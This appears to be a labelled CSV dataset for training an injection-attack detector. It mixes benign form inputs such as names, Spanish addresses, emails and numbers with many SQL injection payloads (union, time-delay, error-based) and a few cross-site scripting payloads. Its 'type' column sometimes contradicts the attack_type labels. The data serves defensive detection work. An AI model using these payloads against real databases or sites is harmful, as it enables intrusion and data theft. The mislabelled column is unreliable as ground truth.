Text,attack_type,Label,type
1' in boolean mode);select (case when (1812=2446) then 1812 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
oasi0s,norm,0,normal
23599996h,norm,0,normal
junmeng,norm,0,normal
vannuchhi_ecoffery@hotelesjerez.vc,norm,0,normal
"1"") as yecj where 1194=1194 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
a6ordab07,norm,0,normal
66091214r,norm,0,normal
"-2855""))) union all select 1496,1496,1496,1496#",sqli,1,sql
peller@arvigar.gs,norm,0,normal
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",sqli,1,sql
felisa,norm,0,normal
7003,norm,0,normal
atilio,norm,0,normal
"1)) and elt(4249=4249,7259) and ((5683=5683",sqli,1,normal
"-3902'))) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",sqli,1,sql
baston_lory@provider.com.mk,norm,0,normal
villaornate y castro,norm,0,normal
serra stark,norm,0,normal
palidwor,norm,0,normal
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('ngwt'='ngwt",sqli,1,normal
ceciley,norm,0,normal
"1 union all select null,null,null,null,null,null,null#",sqli,1,sql
9p30a,norm,0,normal
entwistle_ruetting@comonuevo.ro,norm,0,normal
roi,norm,0,normal
0527381182420490,norm,0,normal
1))) and 6358=6735,sqli,1,normal
reco.cida,norm,0,normal
"-6368' union all select 6529,6529,6529--",sqli,1,sql
48426953q,norm,0,normal
37110,norm,0,normal
(select (case when (6986=6986) then 6986 else 6986*(select 6986 from mysql.db) end)),sqli,1,sql
caravaca de la cruz,norm,0,normal
kindelan,norm,0,normal
6820667917309161,norm,0,normal
esite,norm,0,normal
pilotaje,norm,0,normal
06196,norm,0,normal
"1'||(select 'vpuh' where 8164=8164;select like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli,1,sql
hembrick,norm,0,normal
"c/ valdepalitos 155, 5-a",norm,0,normal
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('brlc'='brlc",sqli,1,normal
uytterlinden@lamolahotel.ro,norm,0,normal
l0cianesco,norm,0,normal
evarist arnus 5 11-d,norm,0,normal
pamente,norm,0,normal
50228,norm,0,normal
nao,norm,0,normal
reencarnar,norm,0,normal
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
10620,norm,0,normal
iara,norm,0,normal
valvular,norm,0,normal
"-5524) as eoyk where 6928=6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",sqli,1,sql
vahid,norm,0,normal
30388165j,norm,0,normal
"c/ de puigcerda s/n, 1-g",norm,0,normal
brunhild,norm,0,normal
abades,norm,0,normal
gracindo@ajuntamentbcn2-0.jp,norm,0,normal
"1))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((1748=1748",sqli,1,normal
10182,norm,0,normal
46704601l,norm,0,normal
08580215l,norm,0,normal
sprouse,norm,0,normal
18311,norm,0,normal
woolgar@awat.gov,norm,0,normal
96269598q,norm,0,normal
eulalio,norm,0,normal
milad,norm,0,normal
6020931193339547,norm,0,normal
"-4015"" where 2610=2610 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
autoritariamente,norm,0,normal
1'+(select 'hplm' where 4008=4008 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
c/ sarasate 143,norm,0,normal
tersilio,norm,0,normal
"1') or elt(6272=6272,sleep(5)) and ('yznd' like 'yznd",sqli,1,normal
bateman@alojesuweb.in,norm,0,normal
58305784w,norm,0,normal
cuartn,norm,0,normal
yamilem,norm,0,normal
nicolett,norm,0,normal
mathieu,norm,0,normal
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",sqli,1,normal
marginet,norm,0,normal
nugent,norm,0,normal
montaesismo,norm,0,normal
sabionda,norm,0,normal
espn boixad,norm,0,normal
"1') where 8268=8268 union all select null,null,null,null--",sqli,1,sql
1)));select pg_sleep(5) and (((9476=9476,sqli,1,sql
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,1,normal
c/ florida 180 1?b,norm,0,normal
santa coloma,norm,0,normal
1') or sleep(5) and ('fizk'='fizk,sqli,1,normal
17743,norm,0,normal
1228688038789321,norm,0,normal
demias,norm,0,normal
rahue,norm,0,normal
fuembellida,norm,0,normal
saleh,norm,0,normal
1ed6at0zacin,norm,0,normal
"-9574%')) union all select 5645,5645,5645,5645,5645,5645,5645--",sqli,1,sql
keely4,norm,0,normal
"-9526 where 5734=5734 or elt(1032=1032,3623)--",sqli,1,sql
26015420m,norm,0,normal
9751,norm,0,normal
car,norm,0,normal
"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('crosssitescripting');"">",xss,2,xss
64633352v,norm,0,normal
22513,norm,0,normal
"-2197' union all select 8065,8065,8065,8065--",sqli,1,sql
1' where 5458=5458 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
campe6n,norm,0,normal
1')));select pg_sleep(5) and ((('mgbm' like 'mgbm,sqli,1,sql
paracuellos de jarama,norm,0,normal
-2951 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# gwqv,sqli,1,sql
syun,norm,0,normal
caine@albeiteria.es,norm,0,normal
"entrada el zurdo, 166 7?e",norm,0,normal
1')) and sleep(5) and (('jiio' like 'jiio,sqli,1,normal
28782647x,norm,0,normal
1)) as oqui where 3368=3368 order by 1--,sqli,1,sql
abrucena,norm,0,normal
"1"" where 2462=2462 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
marrocchi,norm,0,normal
daviu callarisa,norm,0,normal
50420,norm,0,normal
1) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
keaton3,norm,0,normal
1'||(select 'nvvm' from dual where 5567=5567 rlike (select * from (select(sleep(5)))sgvo))||',sqli,1,sql
8852,norm,0,normal
97228883v,norm,0,normal
"1,iif(6625=6625,1,1/0)",sqli,1,normal
72500690k,norm,0,normal
nanook@cup-id.lu,norm,0,normal
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('wusq'='wusq",sqli,1,sql
"1%'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('%'='",sqli,1,normal
3sc8r4a8anada,norm,0,normal
"1'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('sbey'='sbey",sqli,1,sql
"1""));select case when 1802=7063 then 1 else null end--",sqli,1,sql
6687072478385848,norm,0,normal
desacertadamente,norm,0,normal
deysi,norm,0,normal
1));select (case when (9696=2874) then 1 else 9696*(select 9696 from master..sysdatabases) end)--,sqli,1,sql
37217,norm,0,normal
alburqueque fraguas,norm,0,normal
">""<div style=""behaviour: url([link to code]);"">",xss,2,sql
4611888318080805,norm,0,normal
"1) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
2503735497393534,norm,0,normal
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)# tcrm",sqli,1,normal
ervin,norm,0,normal
torrejn de ardoz,norm,0,normal
marlaud_losee5@redesmilitantes.tf,norm,0,normal
-6036))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((6723=6723,sqli,1,sql
karin,norm,0,normal
3900278592647415,norm,0,normal
1025489401142113,norm,0,normal
kimberle,norm,0,normal
muente monfulle,norm,0,normal
rossenberck,norm,0,normal
afelpar,norm,0,normal
carretera 7 hasta km. 4 rueda 5 13f,norm,0,normal
cazoln,norm,0,normal
crdoba,norm,0,normal
levert_lightfoot@laschinas.tm,norm,0,normal
9136,norm,0,normal
1'||(select 'ytwz' from dual where 3025=3025 and (5039=5303)*5303)||',sqli,1,sql
"1"") where 5698=5698 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
0029687955884916,norm,0,normal
"1' union all select null,null,null,null,null,null,null#",sqli,1,sql
"1%')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
pastelear,norm,0,normal
66718383y,norm,0,normal
sylvie@laspruebascongaseosa.pk,norm,0,normal
"1"" where 6352=6352;begin dbms_lock.sleep(5); end--",sqli,1,sql
34575761e,norm,0,normal
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
yactura,norm,0,normal
erich,norm,0,normal
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""sfnj"" like ""sfnj",sqli,1,sql
adolphe,norm,0,normal
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('ztmd'='ztmd",sqli,1,sql
33775,norm,0,normal
wessell.georg@smalltec.md,norm,0,normal
"1"") as jiiq where 6847=6847;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
aburelado,norm,0,normal
"mourel 113, 4?a",norm,0,normal
javiera,norm,0,normal
"1));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1"") where 7957=7957 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
trasabuela,norm,0,normal
empece9ora,norm,0,normal
arditi-alexis@capitalinvest.vc,norm,0,normal
valle de yerri/deierri,norm,0,normal
"camino elorrieta, 193, 2a",norm,0,normal
yasmmane,norm,0,normal
cmitre,norm,0,normal
1' in boolean mode);select sleep(5)#,sqli,1,sql
5874582536939538,norm,0,normal
1')));select (case when (8234=2498) then 8234 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ajkb'='ajkb",sqli,1,sql
berto,norm,0,normal
borrenes,norm,0,normal
"1""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
1%')));begin dbms_lock.sleep(5); end--,sqli,1,sql
"1) union all select null,null,null,null#",sqli,1,sql
1' or sleep(5),sqli,1,normal
"1' where 1031=1031 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
03380,norm,0,normal
"<keygen id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",xss,2,xss
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'ggcm' like 'ggcm",sqli,1,normal
pedrosa de ro rbel,norm,0,normal
116,norm,0,normal
"1%"")) and elt(1210=1210,sleep(5)) and ((""%""=""",sqli,1,normal
6676519616771498,norm,0,normal
nelsen,norm,0,normal
caryl,norm,0,normal
1542089007800249,norm,0,normal
"1'||(select 'hrpa' where 1973=1973 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
italo,norm,0,normal
26100,norm,0,normal
"valencia, 79 12?h",norm,0,normal
-8234'))) or 9323=9323#,sqli,1,normal
5453326584346927,norm,0,normal
castilleja de guzmn,norm,0,normal
almonacid de la sierra,norm,0,normal
(select (case when (5603=5603) then 5603 else cast(1 as int)/(select 0 from dual) end) from dual),sqli,1,sql
thuswald,norm,0,normal
"1') where 4092=4092 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
07650,norm,0,normal
"1"" where 1765=1765 union all select null,null,null,null,null,null#",sqli,1,sql
1)) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((4279=4279,sqli,1,sql
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('zjnp'='zjnp",sqli,1,sql
9u5es2v83ent2,norm,0,normal
arenys de mar,norm,0,normal
"c/ mare de deu de la merce, s/n, 8-e",norm,0,normal
gimialcn,norm,0,normal
61089610t,norm,0,normal
reinaldo,norm,0,normal
1%' union all select null#,sqli,1,sql
0067950417243485,norm,0,normal
"1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (4976=4976",sqli,1,sql
"1"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
carmnea,norm,0,normal
"1"" where 5845=5845 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
tinti@21horas.hr,norm,0,normal
wackernagel@tiendasyofertas.je,norm,0,normal
5212327174460921,norm,0,normal
13g0e7at42a,norm,0,normal
pullman-mcclintock@surcosur.st,norm,0,normal
luciano nagel,norm,0,normal
8466112924954826,norm,0,normal
matungo,norm,0,normal
"1'+(select kfmv where 1679=1679;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",sqli,1,sql
16370,norm,0,normal
88684338h,norm,0,normal
anunciador,norm,0,normal
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('%'='",sqli,1,sql
98993276b,norm,0,normal
"-7423 or make_set(9354=9354,7185)-- hprc",sqli,1,sql
2epullo,norm,0,normal
"-5411%"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",sqli,1,sql
"1"" where 4345=4345 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,sql
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
21,norm,0,normal
garabatos,norm,0,normal
ron,norm,0,normal
51620770f,norm,0,normal
"""alert(1)"">",xss,2,normal
5564387106032585,norm,0,normal
trigo retuerta,norm,0,normal
3376121794389360,norm,0,normal
rawdon,norm,0,normal
1 or 6793=(select 6793 from pg_sleep(5))-- fyaq,sqli,1,sql
lemin@11horas.mz,norm,0,normal
"1')) as fcjk where 7755=7755;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
griffith,norm,0,normal
1' where 8099=8099;waitfor delay '0:0:5'--,sqli,1,sql
";!--""<xss>=&{()}""",xss,2,sql
olmstead@ballerpoker.tr,norm,0,normal
perla,norm,0,normal
1);waitfor delay '0:0:5',sqli,1,sql
-1257') order by 1#,sqli,1,normal
terkel@so-tel.cx,norm,0,normal
"1%"");select (case when (3168=5577) then 3168 else 3168*(select 3168 from mysql.db) end)#",sqli,1,sql
"1"" union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1"")) as tgwp where 9405=9405;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
02124892z,norm,0,normal
lightner.manor@rosaserigrafia.as,norm,0,normal
"1)) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((9325=9325",sqli,1,sql
-9501') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('mndw'='mndw,sqli,1,sql
4761077405436088,norm,0,normal
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('mmow'='mmow,sqli,1,sql
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
ren,norm,0,normal
"1') where 3579=3579 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
"-2790%"") union all select 5070,5070#",sqli,1,sql
desca.der9r,norm,0,normal
"-5925) where 5758=5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",sqli,1,sql
"-5528') union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",sqli,1,sql
"-2605%'))) union all select 4738,4738#",sqli,1,sql
991,norm,0,normal
47651101t,norm,0,normal
corulln,norm,0,normal
12191,norm,0,normal
5,norm,0,normal
"1%"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""%""=""",sqli,1,normal
"1""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""oohx"" like ""oohx",sqli,1,normal
"<div datafld=""b"" dataformatas=""html"" dataid=xss src=""#xss""></div>",xss,2,normal
"1' union all select null,null,null,null,null,null,null--",sqli,1,sql
chap8n,norm,0,normal
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('xlvt'='xlvt",sqli,1,sql
08tiro72,norm,0,normal
"c/ brazato, 132 2?g",norm,0,normal
1' and 6969=(select 6969 from pg_sleep(5)) and 'lqsa' like 'lqsa,sqli,1,sql
3151,norm,0,normal
"1) where 7425=7425 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
1 rlike (select * from (select(sleep(5)))sgvo)# ewsz,sqli,1,sql
1943374801106050,norm,0,normal
tijuana 121,norm,0,normal
"(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
"calle finlandia, 46, 6-a",norm,0,normal
villar de la encina,norm,0,normal
02683341t,norm,0,normal
9334,norm,0,normal
2502,norm,0,normal
grecia,norm,0,normal
"-3226'||(select 'ykdw' where 2617=2617 union all select 2617,2617--",sqli,1,sql
"-9606%""))) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",sqli,1,sql
muro de aguas,norm,0,normal
"el provencio, 6 8f",norm,0,normal
6015,norm,0,normal
-5250) where 1591=1591 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
"-8069)) as sxbn where 7689=7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",sqli,1,sql
50684,norm,0,normal
1%') waitfor delay '0:0:5' and ('%'=',sqli,1,normal
75771832b,norm,0,normal
0cep8o,norm,0,normal
tordmar,norm,0,normal
monteoliva pags,norm,0,normal
"1%"" union all select null,null#",sqli,1,sql
prell@davidymamen.tc,norm,0,normal
40355743n,norm,0,normal
50296685d,norm,0,normal
villanueva gualano,norm,0,normal
"1'))) and elt(3114=3114,sleep(5))#",sqli,1,normal
1' rlike sleep(5) and 'ojqz' like 'ojqz,sqli,1,normal
1)) as wrhe where 6120=6120 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
maximinio,norm,0,normal
kolanko lisarde,norm,0,normal
9469363805920564,norm,0,normal
"c/ salvatella, 98 11?h",norm,0,normal
60142978w,norm,0,normal
cimorro,norm,0,normal
"1') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
pesado,norm,0,normal
73002359z,norm,0,normal
aforzarse,norm,0,normal
panov@ballerpoker.sh,norm,0,normal
28991243l,norm,0,normal
"1"") as ymto where 3453=3453;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
mohsen,norm,0,normal
jugen,norm,0,normal
9a26re88,norm,0,normal
bril?l7du4a,norm,0,normal
"1) where 8734=8734 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
carroll,norm,0,normal
ondara,norm,0,normal
pagny@cpanelweb.yu,norm,0,normal
jauyau,norm,0,normal
"1') where 3572=3572;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
clunes7@palodegolf.com.coop,norm,0,normal
"parque barranco de coquin 67, 8?d",norm,0,normal
fundamentalmente,norm,0,normal
1'||(select 'gdzt' where 4950=4950;select sleep(5)#,sqli,1,sql
bashan@lettere.pr,norm,0,normal
escuder liveris,norm,0,normal
1) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (4703=4703,sqli,1,sql
1 and 9412=6877#,sqli,1,normal
almirante,norm,0,normal
"-3975') or make_set(1943=3499,3499) and ('dawb'='dawb",sqli,1,normal
73361115q,norm,0,normal
10939093v,norm,0,normal
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)-- ofqd",sqli,1,sql
"eduardo alvarez, 28",norm,0,normal
8721,norm,0,normal
c63en13759,norm,0,normal
rocinante,norm,0,normal
recerdo,norm,0,normal
arn cantisn,norm,0,normal
"-3834'))) union all select 8313,8313--",sqli,1,sql
"1%')));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1"" where 4066=4066 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
8151,norm,0,normal
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('ltki'='ltki,sqli,1,sql
45222,norm,0,normal
fontanal callarisa,norm,0,normal
"c/ alfonso de armas ayala s/n,",norm,0,normal
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"caridad 82,",norm,0,normal
56876281h,norm,0,normal
1635,norm,0,normal
oseja,norm,0,normal
"data:text/html,<script>alert(0)</script>",xss,2,xss
-1385'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('mjjd'='mjjd,sqli,1,sql
25270,norm,0,normal
50422961s,norm,0,normal
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""msjh"" like ""msjh",sqli,1,sql
damia@elgrancolisionadordehadrones.es,norm,0,normal
-9711'+(select 'ckpj' where 8338=8338 union all select 8338--,sqli,1,sql
suplementero,norm,0,normal
beniarj,norm,0,normal
1' and (3020=3020)*6703 and 'qsrz'='qsrz,sqli,1,normal
1) rlike sleep(5) and (5724=5724,sqli,1,normal
raudres,norm,0,normal
wee-seng,norm,0,normal
"1%' and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-1413"") union all select 6651,6651,6651--",sqli,1,sql
05781002k,norm,0,normal
7581478216887390,norm,0,normal
violy belcastro,norm,0,normal
oleilnikov_balasko@hostprofessional.ac,norm,0,normal
"1%"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
12188295c,norm,0,normal
75817612k,norm,0,normal
2753394337556822,norm,0,normal
"1"") where 6138=6138 and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",sqli,1,sql
bolt@expofloralzaragoza2014.py,norm,0,normal
08776,norm,0,normal
lloyd-pack-partain@elalamorestaurante.ir,norm,0,normal
1');select (case when (7096=2568) then 7096 else 1/(select 0) end)--,sqli,1,sql
alred,norm,0,normal
sikes-jeans@923.mv,norm,0,normal
jord,norm,0,normal
"-2568"") or (8459=8459)*4906 and (""exyw""=""exyw",sqli,1,normal
"-3437) union all select 7774,7774,7774--",sqli,1,sql
43376,norm,0,normal
ajaraca,norm,0,normal
25307,norm,0,normal
patea64ra,norm,0,normal
"-6085 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
tarasewi,norm,0,normal
santamarina,norm,0,normal
"1""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
atletismo,norm,0,normal
holoubek@hojainformativas.ua,norm,0,normal
"1"" where 6004=6004;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
calle jeremias 14 7b,norm,0,normal
"-3731'))) or elt(7540=1412,1412) and ((('iwch'='iwch",sqli,1,normal
iznate,norm,0,normal
8866,norm,0,normal
atrazar,norm,0,normal
"<div style=""width: expression(alert('crosssitescripting'));"">",xss,2,sql
97531792q,norm,0,normal
sescun3ia,norm,0,normal
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
21335513t,norm,0,normal
globula*riceo,norm,0,normal
28721,norm,0,normal
odelsia,norm,0,normal
mandayona,norm,0,normal
"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",sqli,1,sql
g3a254,norm,0,normal
"carrer vilaseca 141, 12?e",norm,0,normal
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"-3952') union all select 6644,6644,6644--",sqli,1,sql
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('cdaq' like 'cdaq",sqli,1,sql
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
mascarino.marenghi@cocheacoche.lv,norm,0,normal
peredo huecas,norm,0,normal
"alcatraz, 43, 2-g",norm,0,normal
p6lma13isti,norm,0,normal
47160,norm,0,normal
"1')) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
44322044d,norm,0,normal
"1"") or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
redecilla del campo,norm,0,normal
irado,norm,0,normal
477dj6r,norm,0,normal
16312,norm,0,normal
"1' where 6905=6905 union all select null,null,null,null,null,null#",sqli,1,sql
talmadge@movintel.uz,norm,0,normal
1%'))) or sleep(5) and ((('%'=',sqli,1,normal
5963975561813500,norm,0,normal
"-8133') union all select 6417,6417,6417,6417,6417,6417,6417,6417--",sqli,1,sql
"-9810') where 4361=4361 or elt(1032=1032,3623)--",sqli,1,sql
